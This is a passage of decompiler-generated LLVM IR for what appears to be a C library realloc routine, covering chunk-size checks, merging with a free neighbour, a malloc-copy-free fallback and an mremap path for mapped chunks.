  br i1 %tmp21, label %dec_label_pc_80528cb, label %dec_label_pc_80528c4

dec_label_pc_80528c4:                             ; preds = %dec_label_pc_80528b4
  %v1_80528c4 = and i32 %v1_80528b4, -8
  br label %dec_label_pc_80528cb

dec_label_pc_80528cb:                             ; preds = %dec_label_pc_80528b4, %dec_label_pc_80528c4
  %stack_var_-40.0 = phi i32 [ %v1_80528c4, %dec_label_pc_80528c4 ], [ 16, %dec_label_pc_80528b4 ]
  %storemerge = phi i32 [ %v1_80528c4, %dec_label_pc_80528c4 ], [ %v1_80528b4, %dec_label_pc_80528b4 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80528cf = add i32 %tmp7, -8
  store i32 %v1_80528cf, i32* @edi, align 4
  %v1_80528d2 = add i32 %tmp7, -4
  %v2_80528d2 = inttoptr i32 %v1_80528d2 to i32*
  %v3_80528d2 = load i32, i32* %v2_80528d2, align 4
  store i32 %v3_80528d2, i32* %edx.global-to-local, align 4
  %v1_80528d7 = and i32 %v3_80528d2, -4
  store i32 %v1_80528d7, i32* @ebp, align 4
  %v2_80528da = and i32 %v3_80528d2, 2
  %v3_80528da = icmp eq i32 %v2_80528da, 0
  %v1_80528dd = icmp eq i1 %v3_80528da, false
  br i1 %v1_80528dd, label %dec_label_pc_8052a66, label %dec_label_pc_80528e3

dec_label_pc_80528e3:                             ; preds = %dec_label_pc_80528cb
  store i32 %v1_80528d7, i32* @ebx, align 4
  %v10_80528e5 = icmp ult i32 %v1_80528d7, %stack_var_-40.0
  %v1_80528e9 = icmp eq i1 %v10_80528e5, false
  br i1 %v1_80528e9, label %dec_label_pc_8052a12, label %dec_label_pc_80528ef

dec_label_pc_80528ef:                             ; preds = %dec_label_pc_80528e3
  %v2_80528ef = add i32 %v1_80528d7, %v1_80528cf
  store i32 %v2_80528ef, i32* @esi, align 4
  %v1_80528f2 = load i32, i32* @global_var_805aaac.283, align 4
  %v12_80528f2 = icmp eq i32 %v2_80528ef, %v1_80528f2
  %v1_80528f8 = icmp eq i1 %v12_80528f2, false
  %v1_8052935 = add i32 %v2_80528ef, 4
  %v2_8052935 = inttoptr i32 %v1_8052935 to i32*
  %v3_8052935 = load i32, i32* %v2_8052935, align 4
  br i1 %v1_80528f8, label %dec_label_pc_8052935, label %dec_label_pc_80528fa

dec_label_pc_80528fa:                             ; preds = %dec_label_pc_80528ef
  %v1_80528fd = and i32 %v3_8052935, -4
  %v2_8052900 = add i32 %v1_80528fd, %v1_80528d7
  store i32 %v2_8052900, i32* %ecx.global-to-local, align 4
  %v1_8052907 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8052907, i32* %eax.global-to-local, align 4
  %v7_805290a = icmp ult i32 %v2_8052900, %v1_8052907
  br i1 %v7_805290a, label %dec_label_pc_8052970, label %dec_label_pc_805290e

dec_label_pc_805290e:                             ; preds = %dec_label_pc_80528fa
  %v1_805290e = urem i32 %v3_80528d2, 2
  store i32 %tmp7, i32* @ebx, align 4
  %v5_8052915 = or i32 %v1_805290e, %stack_var_-40.0
  store i32 %v5_8052915, i32* %v2_80528d2, align 4
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v0_8052920 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052920 = sub i32 %v0_8052920, %stack_var_-40.0
  %v0_8052922 = load i32, i32* @edi, align 4
  %v2_8052922 = add i32 %v0_8052922, %stack_var_-40.0
  store i32 %v2_8052922, i32* %eax.global-to-local, align 4
  %v1_8052925 = or i32 %v2_8052920, 1
  store i32 %v1_8052925, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052922, i32* @global_var_805aaac.283, align 4
  %v2_805292d = add i32 %v2_8052922, 4
  %v3_805292d = inttoptr i32 %v2_805292d to i32*
  store i32 %v1_8052925, i32* %v3_805292d, align 4
  br label %dec_label_pc_8052b2f

dec_label_pc_8052935:                             ; preds = %dec_label_pc_80528ef
  store i32 %v3_8052935, i32* %edx.global-to-local, align 4
  %v1_805293a = and i32 %v3_8052935, -2
  store i32 %v1_805293a, i32* %eax.global-to-local, align 4
  %v3_805293d = add i32 %v1_8052935, %v1_805293a
  %v4_805293d = inttoptr i32 %v3_805293d to i8*
  %v5_805293d = load i8, i8* %v4_805293d, align 1
  %v6_805293d = urem i8 %v5_805293d, 2
  %v7_805293d = icmp eq i8 %v6_805293d, 0
  %v1_8052942 = icmp eq i1 %v7_805293d, false
  br i1 %v1_8052942, label %dec_label_pc_8052970, label %dec_label_pc_8052944

dec_label_pc_8052944:                             ; preds = %dec_label_pc_8052935
  %v1_8052944 = and i32 %v3_8052935, -4
  store i32 %v1_8052944, i32* %edx.global-to-local, align 4
  %v2_8052947 = add i32 %v1_8052944, %v1_80528d7
  store i32 %v2_8052947, i32* @ebx, align 4
  %v10_805294a = icmp ult i32 %v2_8052947, %stack_var_-40.0
  br i1 %v10_805294a, label %dec_label_pc_8052970, label %dec_label_pc_8052950

dec_label_pc_8052950:                             ; preds = %dec_label_pc_8052944
  %v1_8052950 = add i32 %v1_80528d7, %tmp7
  %v2_8052950 = inttoptr i32 %v1_8052950 to i32*
  %v3_8052950 = load i32, i32* %v2_8052950, align 4
  store i32 %v3_8052950, i32* %edx.global-to-local, align 4
  %v1_8052953 = add i32 %v2_80528ef, 12
  %v2_8052953 = inttoptr i32 %v1_8052953 to i32*
  %v3_8052953 = load i32, i32* %v2_8052953, align 4
  store i32 %v3_8052953, i32* %eax.global-to-local, align 4
  %v1_8052956 = add i32 %v3_8052950, 12
  %v2_8052956 = inttoptr i32 %v1_8052956 to i32*
  %v3_8052956 = load i32, i32* %v2_8052956, align 4
  %v15_8052956 = icmp eq i32 %v3_8052956, %v2_80528ef
  %v1_8052959 = icmp eq i1 %v15_8052956, false
  br i1 %v1_8052959, label %dec_label_pc_8052960, label %dec_label_pc_805295b

dec_label_pc_805295b:                             ; preds = %dec_label_pc_8052950
  %v1_805295b = add i32 %v3_8052953, 8
  %v2_805295b = inttoptr i32 %v1_805295b to i32*
  %v3_805295b = load i32, i32* %v2_805295b, align 4
  %v15_805295b = icmp eq i32 %v3_805295b, %v2_80528ef
  br i1 %v15_805295b, label %dec_label_pc_8052965, label %dec_label_pc_8052960

dec_label_pc_8052960:                             ; preds = %dec_label_pc_805295b, %dec_label_pc_8052950
  %v0_8052960 = call i32 @abort()
  store i32 %v0_8052960, i32* %eax.global-to-local, align 4
  %v1_8052965.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052965

dec_label_pc_8052965:                             ; preds = %dec_label_pc_805295b, %dec_label_pc_8052960
  %v1_8052965 = phi i32 [ %v3_8052950, %dec_label_pc_805295b ], [ %v1_8052965.pre, %dec_label_pc_8052960 ]
  %v0_8052965 = phi i32 [ %v3_8052953, %dec_label_pc_805295b ], [ %v0_8052960, %dec_label_pc_8052960 ]
  %v2_8052965 = add i32 %v1_8052965, 12
  %v3_8052965 = inttoptr i32 %v2_8052965 to i32*
  store i32 %v0_8052965, i32* %v3_8052965, align 4
  %v0_8052968 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052968 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052968 = add i32 %v1_8052968, 8
  %v3_8052968 = inttoptr i32 %v2_8052968 to i32*
  store i32 %v0_8052968, i32* %v3_8052968, align 4
  %v0_8052a12.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052a12

dec_label_pc_8052970:                             ; preds = %dec_label_pc_8052944, %dec_label_pc_8052935, %dec_label_pc_80528fa
  store i32 0, i32* @ebx, align 4
  %v1_8052976 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8052976, i32* %eax.global-to-local, align 4
  store i32 %v1_8052976, i32* %stack_var_-48, align 4
  %v1_805297a = call i32 @malloc(i32 %v1_8052976)
  store i32 %v1_805297a, i32* %edx.global-to-local, align 4
  store i32 %v1_8052976, i32* %eax.global-to-local, align 4
  %v1_8052982 = icmp eq i32 %v1_805297a, 0
  br i1 %v1_8052982, label %dec_label_pc_8052b2f, label %dec_label_pc_805298a

dec_label_pc_805298a:                             ; preds = %dec_label_pc_8052970
  %v1_805298a = add i32 %v1_805297a, -8
  store i32 %v1_805298a, i32* @ebx, align 4
  %v1_805298d = load i32, i32* @esi, align 4
  %v12_805298d = icmp eq i32 %v1_805298a, %v1_805298d
  %v1_805298f = add i32 %v1_805297a, -4
  %v2_805298f = inttoptr i32 %v1_805298f to i32*
  %v3_805298f = load i32, i32* %v2_805298f, align 4
  store i32 %v3_805298f, i32* %eax.global-to-local, align 4
  %v1_8052992 = icmp eq i1 %v12_805298d, false
  br i1 %v1_8052992, label %dec_label_pc_805299c, label %dec_label_pc_8052994

dec_label_pc_8052994:                             ; preds = %dec_label_pc_805298a
  %v1_8052994 = and i32 %v3_805298f, -4
  store i32 %v1_8052994, i32* %eax.global-to-local, align 4
  %v1_8052997 = load i32, i32* @ebp, align 4
  %v2_8052997 = add i32 %v1_8052997, %v1_8052994
  store i32 %v2_8052997, i32* @ebx, align 4
  br label %dec_label_pc_8052a12

dec_label_pc_805299c:                             ; preds = %dec_label_pc_805298a
  %v0_805299c = load i32, i32* @ebp, align 4
  %v1_805299c = add i32 %v0_805299c, -4
  store i32 %v1_805299c, i32* %eax.global-to-local, align 4
  %v2_80529a1 = udiv i32 %v1_805299c, 4
  store i32 %v2_80529a1, i32* %ecx.global-to-local, align 4
  %v5_80529a4 = icmp ult i32 %v1_805299c, 36
  %tmp = and i32 %v1_805299c, -4
  %tmp26 = icmp eq i32 %tmp, 36
  %v2_80529a7 = or i1 %v5_80529a4, %tmp26
  br i1 %v2_80529a7, label %dec_label_pc_80529b9, label %dec_label_pc_80529a9

dec_label_pc_80529a9:                             ; preds = %dec_label_pc_805299c
  store i32 %v1_805299c, i32* %stack_var_-48, align 4
  %v3_80529af = inttoptr i32 %v1_805297a to i8*
  %v4_80529af = call i32 @memcpy(i8* %v3_80529af, i32 %tmp7, i32 %v1_805299c)
  store i32 %v4_80529af, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052a00

dec_label_pc_80529b9:                             ; preds = %dec_label_pc_805299c
  store i32 %tmp7, i32* @esi, align 4
  %v5_80529bd = icmp ult i32 %v1_805299c, 16
  %tmp27 = and i32 %v1_805299c, -4
  %tmp28 = icmp eq i32 %tmp27, 16
  %v2_80529c0 = load i32, i32* %arg1, align 4
  store i32 %v2_80529c0, i32* %eax.global-to-local, align 4
  %v2_80529c2 = inttoptr i32 %v1_805297a to i32*
  store i32 %v2_80529c0, i32* %v2_80529c2, align 4
  %v0_80529c4 = load i32, i32* @esi, align 4
  %v1_80529c4 = add i32 %v0_80529c4, 4
  %v2_80529c4 = inttoptr i32 %v1_80529c4 to i32*
  %v3_80529c4 = load i32, i32* %v2_80529c4, align 4
  store i32 %v3_80529c4, i32* %eax.global-to-local, align 4
  %v2_80529c7 = add i32 %v1_805297a, 4
  %v3_80529c7 = inttoptr i32 %v2_80529c7 to i32*
  store i32 %v3_80529c4, i32* %v3_80529c7, align 4
  %v0_80529ca = load i32, i32* @esi, align 4
  %v1_80529ca = add i32 %v0_80529ca, 8
  %v2_80529ca = inttoptr i32 %v1_80529ca to i32*
  %v3_80529ca = load i32, i32* %v2_80529ca, align 4
  store i32 %v3_80529ca, i32* %eax.global-to-local, align 4
  %v2_80529cd = add i32 %v1_805297a, 8
  %v3_80529cd = inttoptr i32 %v2_80529cd to i32*
  store i32 %v3_80529ca, i32* %v3_80529cd, align 4
  %v2_80529d0 = or i1 %v5_80529bd, %tmp28
  br i1 %v2_80529d0, label %dec_label_pc_8052a00, label %dec_label_pc_80529d2

dec_label_pc_80529d2:                             ; preds = %dec_label_pc_80529b9
  %v0_80529d2 = load i32, i32* @esi, align 4
  %v1_80529d2 = add i32 %v0_80529d2, 12
  %v2_80529d2 = inttoptr i32 %v1_80529d2 to i32*
  %v3_80529d2 = load i32, i32* %v2_80529d2, align 4
  store i32 %v3_80529d2, i32* %eax.global-to-local, align 4
  %v0_80529d5 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80529d8 = add i32 %v1_805297a, 12
  %v3_80529d8 = inttoptr i32 %v2_80529d8 to i32*
  store i32 %v3_80529d2, i32* %v3_80529d8, align 4
  %v0_80529db = load i32, i32* @esi, align 4
  %v1_80529db = add i32 %v0_80529db, 16
  %v2_80529db = inttoptr i32 %v1_80529db to i32*
  %v3_80529db = load i32, i32* %v2_80529db, align 4
  store i32 %v3_80529db, i32* %eax.global-to-local, align 4
  %v2_80529de = add i32 %v1_805297a, 16
  %v3_80529de = inttoptr i32 %v2_80529de to i32*
  store i32 %v3_80529db, i32* %v3_80529de, align 4
  %tmp22 = icmp ult i32 %v0_80529d5, 7
  br i1 %tmp22, label %dec_label_pc_8052a00, label %dec_label_pc_80529e3

dec_label_pc_80529e3:                             ; preds = %dec_label_pc_80529d2
  %v0_80529e3 = load i32, i32* @esi, align 4
  %v1_80529e3 = add i32 %v0_80529e3, 20
  %v2_80529e3 = inttoptr i32 %v1_80529e3 to i32*
  %v3_80529e3 = load i32, i32* %v2_80529e3, align 4
  store i32 %v3_80529e3, i32* %eax.global-to-local, align 4
  %v0_80529e6 = load i32, i32* %ecx.global-to-local, align 4
  %v9_80529e6 = icmp eq i32 %v0_80529e6, 9
  %v2_80529e9 = add i32 %v1_805297a, 20
  %v3_80529e9 = inttoptr i32 %v2_80529e9 to i32*
  store i32 %v3_80529e3, i32* %v3_80529e9, align 4
  %v0_80529ec = load i32, i32* @esi, align 4
  %v1_80529ec = add i32 %v0_80529ec, 24
  %v2_80529ec = inttoptr i32 %v1_80529ec to i32*
  %v3_80529ec = load i32, i32* %v2_80529ec, align 4
  store i32 %v3_80529ec, i32* %eax.global-to-local, align 4
  %v2_80529ef = add i32 %v1_805297a, 24
  %v3_80529ef = inttoptr i32 %v2_80529ef to i32*
  store i32 %v3_80529ec, i32* %v3_80529ef, align 4
  %v1_80529f2 = icmp eq i1 %v9_80529e6, false
  br i1 %v1_80529f2, label %dec_label_pc_8052a00, label %dec_label_pc_80529f4

dec_label_pc_80529f4:                             ; preds = %dec_label_pc_80529e3
  %v0_80529f4 = load i32, i32* @esi, align 4
  %v1_80529f4 = add i32 %v0_80529f4, 28
  %v2_80529f4 = inttoptr i32 %v1_80529f4 to i32*
  %v3_80529f4 = load i32, i32* %v2_80529f4, align 4
  store i32 %v3_80529f4, i32* %eax.global-to-local, align 4
  %v2_80529f7 = add i32 %v1_805297a, 28
  %v3_80529f7 = inttoptr i32 %v2_80529f7 to i32*
  store i32 %v3_80529f4, i32* %v3_80529f7, align 4
  %v0_80529fa = load i32, i32* @esi, align 4
  %v1_80529fa = add i32 %v0_80529fa, 32
  %v2_80529fa = inttoptr i32 %v1_80529fa to i32*
  %v3_80529fa = load i32, i32* %v2_80529fa, align 4
  store i32 %v3_80529fa, i32* %eax.global-to-local, align 4
  %v2_80529fd = add i32 %v1_805297a, 32
  %v3_80529fd = inttoptr i32 %v2_80529fd to i32*
  store i32 %v3_80529fa, i32* %v3_80529fd, align 4
  br label %dec_label_pc_8052a00

dec_label_pc_8052a00:                             ; preds = %dec_label_pc_80529e3, %dec_label_pc_80529d2, %dec_label_pc_80529b9, %dec_label_pc_80529a9, %dec_label_pc_80529f4
  store i32 %tmp7, i32* %stack_var_-48, align 4
  %v1_8052a04 = call i32 @free(i32 %tmp7)
  store i32 %v1_8052a04, i32* %eax.global-to-local, align 4
  %v0_8052a09 = load i32, i32* @ebx, align 4
  %v1_8052a09 = add i32 %v0_8052a09, 8
  store i32 %v1_8052a09, i32* @ebx, align 4
  br label %dec_label_pc_8052b2f

dec_label_pc_8052a12:                             ; preds = %dec_label_pc_80528e3, %dec_label_pc_8052994, %dec_label_pc_8052965
  %v1_8052a23 = phi i32 [ %v1_80528d7, %dec_label_pc_80528e3 ], [ %v2_8052997, %dec_label_pc_8052994 ], [ %v0_8052a12.pre, %dec_label_pc_8052965 ]
  %v5_8052a14 = sub i32 %v1_8052a23, %stack_var_-40.0
  store i32 %v5_8052a14, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v5_8052a14, 16
  br i1 %tmp23, label %dec_label_pc_8052a1d, label %dec_label_pc_8052a2f

dec_label_pc_8052a1d:                             ; preds = %dec_label_pc_8052a12
  %v0_8052a1d = load i32, i32* @edi, align 4
  %v1_8052a1d = add i32 %v0_8052a1d, 4
  %v2_8052a1d = inttoptr i32 %v1_8052a1d to i32*
  %v3_8052a1d = load i32, i32* %v2_8052a1d, align 4
  %v1_8052a20 = urem i32 %v3_8052a1d, 2
  %v2_8052a23 = or i32 %v1_8052a20, %v1_8052a23
  store i32 %v2_8052a23, i32* %eax.global-to-local, align 4
  store i32 %v2_8052a23, i32* %v2_8052a1d, align 4
  %v0_8052a28 = load i32, i32* @ebx, align 4
  %v1_8052a28 = load i32, i32* @edi, align 4
  %v2_8052a28 = add i32 %v0_8052a28, 4
  %v3_8052a28 = add i32 %v2_8052a28, %v1_8052a28
  %v4_8052a28 = inttoptr i32 %v3_8052a28 to i32*
  %v5_8052a28 = load i32, i32* %v4_8052a28, align 4
  %v6_8052a28 = or i32 %v5_8052a28, 1
  store i32 %v6_8052a28, i32* %v4_8052a28, align 4
  br label %dec_label_pc_8052a5e

dec_label_pc_8052a2f:                             ; preds = %dec_label_pc_8052a12
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v0_8052a33 = load i32, i32* @edi, align 4
  %v2_8052a33 = add i32 %v0_8052a33, %stack_var_-40.0
  store i32 %v2_8052a33, i32* %eax.global-to-local, align 4
  %v1_8052a36 = add i32 %v0_8052a33, 4
  %v2_8052a36 = inttoptr i32 %v1_8052a36 to i32*
  %v3_8052a36 = load i32, i32* %v2_8052a36, align 4
  %v1_8052a39 = urem i32 %v3_8052a36, 2
  %v5_8052a3c = or i32 %v1_8052a39, %stack_var_-40.0
  store i32 %v5_8052a3c, i32* @esi, align 4
  %v1_8052a46 = or i32 %v5_8052a14, 1
  store i32 %v1_8052a46, i32* %edx.global-to-local, align 4
  store i32 %v5_8052a3c, i32* %v2_8052a36, align 4
  %v0_8052a4c = load i32, i32* %edx.global-to-local, align 4
  %v1_8052a4c = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a4c = add i32 %v1_8052a4c, 4
  %v3_8052a4c = inttoptr i32 %v2_8052a4c to i32*
  store i32 %v0_8052a4c, i32* %v3_8052a4c, align 4
  %v0_8052a4f = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052a4f = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a4f = add i32 %v0_8052a4f, 4
  %v3_8052a4f = add i32 %v2_8052a4f, %v1_8052a4f
  %v4_8052a4f = inttoptr i32 %v3_8052a4f to i32*
  %v5_8052a4f = load i32, i32* %v4_8052a4f, align 4
  %v6_8052a4f = or i32 %v5_8052a4f, 1
  store i32 %v6_8052a4f, i32* %v4_8052a4f, align 4
  %v0_8052a54 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a54 = add i32 %v0_8052a54, 8
  store i32 %v1_8052a54, i32* %eax.global-to-local, align 4
  store i32 %v1_8052a54, i32* %stack_var_-48, align 4
  %v1_8052a58 = call i32 @free(i32 %v1_8052a54)
  store i32 %v1_8052a58, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052a5e

dec_label_pc_8052a5e:                             ; preds = %dec_label_pc_8052a1d, %dec_label_pc_8052a2f
  %v0_8052a5e = load i32, i32* @edi, align 4
  %v1_8052a5e = add i32 %v0_8052a5e, 8
  store i32 %v1_8052a5e, i32* @ebx, align 4
  br label %dec_label_pc_8052b2f

dec_label_pc_8052a66:                             ; preds = %dec_label_pc_80528cb
  store i32 %tmp7, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8052a6e = inttoptr i32 %v1_80528cf to i32*
  %v3_8052a6e = load i32, i32* %v2_8052a6e, align 4
  store i32 %v3_8052a6e, i32* @esi, align 4
  %v0_8052a71 = load i32, i32* @global_var_805addc.289, align 4
  %v2_8052a77 = or i32 %stack_var_-40.0, 3
  %v3_8052a77 = add i32 %v2_8052a77, %v3_8052a6e
  %v5_8052a7b = add i32 %v3_8052a77, %v0_8052a71
  %v1_8052a7f = sub i32 0, %v0_8052a71
  store i32 %v1_8052a7f, i32* %eax.global-to-local, align 4
  %v2_8052a81 = and i32 %v5_8052a7b, %v1_8052a7f
  %v2_8052a87 = sub i32 %v2_8052a81, %v3_8052a6e
  store i32 %v2_8052a87, i32* %edx.global-to-local, align 4
  store i32 %v2_8052a87, i32* %stack_var_-44, align 4
  %v12_8052a8c = icmp eq i32 %v1_80528d7, %v2_8052a87
  br i1 %v12_8052a8c, label %dec_label_pc_8052b2f, label %dec_label_pc_8052a94

dec_label_pc_8052a94:                             ; preds = %dec_label_pc_8052a66
  store i32 1, i32* %stack_var_-48, align 4
  %v2_8052a96 = add i32 %v3_8052a6e, %v1_80528d7
  store i32 %v2_8052a96, i32* %eax.global-to-local, align 4
  %v2_8052a9e = sub i32 %v1_80528cf, %v3_8052a6e
  store i32 %v2_8052a9e, i32* @edi, align 4
  %v6_8052aa2 = call i32 @mremap(i32 %v2_8052a9e, i32 %v2_8052a96, i32 %v2_8052a81, i32 1, i32 %v2_8052a87, i32 %v2_8052a81)
  store i32 %v6_8052aa2, i32* %eax.global-to-local, align 4
  %v10_8052aaa = icmp eq i32 %v6_8052aa2, -1
  br i1 %v10_8052aaa, label %dec_label_pc_8052af2, label %dec_label_pc_8052aaf

dec_label_pc_8052aaf:                             ; preds = %dec_label_pc_8052a94
  %v2_8052aaf = load i32, i32* %stack_var_-44, align 4
  %v3_8052aaf = or i32 %v2_8052aaf, 2
  store i32 %v3_8052aaf, i32* %stack_var_-44, align 4
  %v1_8052ab3 = load i32, i32* @esi, align 4
  %v2_8052ab3 = add i32 %v1_8052ab3, %v6_8052aa2
  store i32 %v2_8052ab3, i32* %edx.global-to-local, align 4
  store i32 %v3_8052aaf, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052a81, i32* %eax.global-to-local, align 4
  %v2_8052abd = add i32 %v2_8052ab3, 4
  %v3_8052abd = inttoptr i32 %v2_8052abd to i32*
  store i32 %v3_8052aaf, i32* %v3_8052abd, align 4
  %v0_8052ac0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ac0 = load i32, i32* @ebp, align 4
  %v2_8052ac0 = sub i32 %v0_8052ac0, %v1_8052ac0
  %v1_8052ac2 = load i32, i32* @global_var_805ade4.294, align 4
  %v2_8052ac2 = add i32 %v1_8052ac2, %v2_8052ac0
  store i32 %v2_8052ac2, i32* %eax.global-to-local, align 4
  store i32 %v2_8052ac2, i32* @global_var_805ade4.294, align 4
  %v1_8052acd = load i32, i32* @global_var_805adf0.295, align 16
  %tmp24 = icmp ugt i32 %v2_8052ac2, %v1_8052acd
  br i1 %tmp24, label %dec_label_pc_8052ad5, label %dec_label_pc_8052ada

dec_label_pc_8052ad5:                             ; preds = %dec_label_pc_8052aaf
  store i32 %v2_8052ac2, i32* @global_var_805adf0.295, align 16
  br label %dec_label_pc_8052ada

dec_label_pc_8052ada:                             ; preds = %dec_label_pc_8052aaf, %dec_label_pc_8052ad5
  %v1_8052ada = load i32, i32* @global_var_805ade8.296, align 8
  %v2_8052ada = add i32 %v1_8052ada, %v2_8052ac2
  store i32 %v2_8052ada, i32* %eax.global-to-local, align 4
  %v1_8052ae0 = load i32, i32* @global_var_805adf4.297, align 4
  %tmp25 = icmp ugt i32 %v2_8052ada, %v1_8052ae0
  br i1 %tmp25, label %dec_label_pc_8052ae8, label %dec_label_pc_8052aed

dec_label_pc_8052ae8:                             ; preds = %dec_label_pc_8052ada
  store i32 %v2_8052ada, i32* @global_var_805adf4.297, align 4
  br label %dec_label_pc_8052aed

dec_label_pc_8052aed:                             ; preds = %dec_label_pc_8052ada, %dec_label_pc_8052ae8
  %v0_8052aed = load i32, i32* %edx.global-to-local, align 4
  %v1_8052aed = add i32 %v0_8052aed, 8
  store i32 %v1_8052aed, i32* @ebx, align 4
  br label %dec_label_pc_8052b2f

dec_label_pc_8052af2:                             ; preds = %dec_label_pc_8052a94
  store i32 %tmp7, i32* @ebx, align 4
  %v1_8052afa = or i32 %stack_var_-40.0, 4
  store i32 %v1_8052afa, i32* %eax.global-to-local, align 4
  %v0_8052afd = load i32, i32* @ebp, align 4
  %v7_8052afd = icmp ult i32 %v0_8052afd, %v1_8052afa
  %v1_8052aff = icmp eq i1 %v7_8052afd, false
  br i1 %v1_8052aff, label %dec_label_pc_8052b2f, label %dec_label_pc_8052b01

dec_label_pc_8052b01:                             ; preds = %dec_label_pc_8052af2
  %v1_8052b05 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8052b05, i32* %eax.global-to-local, align 4
  store i32 %v1_8052b05, i32* %stack_var_-48, align 4
  %v1_8052b09 = call i32 @malloc(i32 %v1_8052b05)
  store i32 %v1_8052b09, i32* %eax.global-to-local, align 4
  store i32 %v1_8052b05, i32* %ecx.global-to-local, align 4
  store i32 %v1_8052b09, i32* @ebx, align 4
  %v1_8052b11 = icmp eq i32 %v1_8052b09, 0
  br i1 %v1_8052b11, label %dec_label_pc_8052b2f, label %dec_label_pc_8052b15

dec_label_pc_8052b15:                             ; preds = %dec_label_pc_8052b01
  %v0_8052b15 = load i32, i32* @ebp, align 4
  %v1_8052b15 = add i32 %v0_8052b15, -8
  store i32 %v1_8052b15, i32* %eax.global-to-local, align 4
  store i32 %v1_8052b15, i32* %stack_var_-48, align 4
  %v3_8052b1e = inttoptr i32 %v1_8052b09 to i8*
  %v4_8052b1e = call i32 @memcpy(i8* %v3_8052b1e, i32 %tmp7, i32 %v1_8052b15)
  store i32 %v4_8052b1e, i32* %eax.global-to-local, align 4
  %v1_8052b27 = call i32 @free(i32 %tmp7)
  store i32 %v1_8052b27, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b2f

dec_label_pc_8052b2f:                             ; preds = %dec_label_pc_8052b01, %dec_label_pc_8052af2, %dec_label_pc_8052a66, %dec_label_pc_8052970, %dec_label_pc_8052aed, %dec_label_pc_8052a5e, %dec_label_pc_8052a00, %dec_label_pc_805290e, %dec_label_pc_8052b15
  store i32 1, i32* %stack_var_-48, align 4
  store i32 %v2_8052885, i32* %eax.global-to-local, align 4
  %v3_8052b36 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v2_8052885, i32* %eax.global-to-local, align 4
  store i32 1, i32* @edx, align 4
  br label %dec_label_pc_8052b3d

dec_label_pc_8052b3d:                             ; preds = %dec_label_pc_80528a1, %dec_label_pc_8052875, %dec_label_pc_8052b2f
  %v0_8052b40 = load i32, i32* @ebx, align 4
  store i32 %v0_8052b40, i32* %eax.global-to-local, align 4
  store i32 %v0_805284f, i32* @ebx, align 4
  store i32 %v0_805284e, i32* @esi, align 4
  store i32 %v0_805284d, i32* @edi, align 4
  store i32 %v0_805284c, i32* @ebp, align 4
  ret i32 %v0_8052b40

; uselistorder directives
  uselistorder i32 %v1_8052afa, { 1, 0 }
  uselistorder i32 %v2_8052ada, { 1, 0, 2 }
  uselistorder i32 %v2_8052ac2, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8052a87, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8052a81, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8052a71, { 1, 0 }
  uselistorder i32 %v3_8052a6e, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_8052a33, { 1, 0 }
  uselistorder i32 %v5_8052a14, { 1, 0, 2 }
  uselistorder i32 %v1_805299c, { 0, 3, 5, 4, 1, 6, 2, 7 }
  uselistorder i32 %v1_805297a, { 4, 5, 10, 6, 11, 9, 7, 1, 2, 3, 0, 8, 12, 13 }
  uselistorder i32 %v2_8052922, { 1, 0, 2 }
  uselistorder i32 %v3_8052935, { 0, 2, 3, 1 }
  uselistorder i32 %v2_80528ef, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_80528d7, { 0, 5, 6, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i32 %v1_80528cf, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 14, 5, 0, 1, 2, 11, 12, 6, 10, 3, 8, 7, 4, 9, 13 }
  uselistorder i32 %v1_80528c4, { 1, 0 }
  uselistorder i32 %v1_80528b4, { 0, 2, 1 }
  uselistorder i32 %v0_805289c, { 1, 0 }
  uselistorder i32 %tmp7, { 14, 1, 13, 12, 11, 10, 9, 8, 2, 0, 7, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 42, 43, 41, 44, 45, 46, 0, 47, 50, 48, 49, 51, 52, 53 }
  uselistorder i32 -32, { 0, 1, 7, 5, 8, 9, 6, 10, 11, 12, 13, 2, 3, 4 }
  uselistorder label %dec_label_pc_8052b3d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052b2f, { 8, 0, 1, 4, 2, 5, 6, 3, 7 }
  uselistorder label %dec_label_pc_8052aed, { 1, 0 }
  uselistorder label %dec_label_pc_8052ada, { 1, 0 }
  uselistorder label %dec_label_pc_8052a5e, { 1, 0 }
  uselistorder label %dec_label_pc_8052a12, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052a00, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052965, { 1, 0 }
  uselistorder label %dec_label_pc_80528cb, { 1, 0 }
  uselistorder label %dec_label_pc_8052875, { 1, 0 }
}

